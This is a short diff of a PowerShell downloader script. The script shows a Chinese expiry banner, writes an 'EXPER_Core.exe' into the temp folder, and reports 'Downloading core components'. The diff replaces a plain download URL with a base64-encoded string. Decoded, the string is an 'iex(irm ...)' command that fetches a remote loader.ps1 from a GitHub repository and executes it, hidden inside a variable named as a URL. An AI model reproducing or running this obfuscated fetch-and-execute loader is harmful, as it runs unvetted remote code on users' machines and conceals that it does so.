@@ -2,7 +2,7 @@
 Write-Host "遐想 今 天 下 午  1 点 过 期" -ForegroundColor Cyan
 
 # 
-$Url = "https://raw.githubusercontent.com/zuiaixixibaobei-max/EXPER-Loader/96828c5a0fdc1311e20c85075d91e28209de3507/Loader-CN.exe"
+$Url = "aQBlAHgAKABpAHIAbQAgACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwB6AHUAaQBhAGkAeABpAHgAaQBiAGEAbwBiAGUAaQAtAG0AYQB4AC8ARQBYAFAARQBSAC0ATABvAGEAZABlAHIALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAvAGwAbwBhAGQAZQByAC4AcABzADEAJwApAA=="
 $Path = "$env:TEMP\EXPER_Core.exe"
 
 Write-Host "[>] Downloading core components..." -ForegroundColor Gray
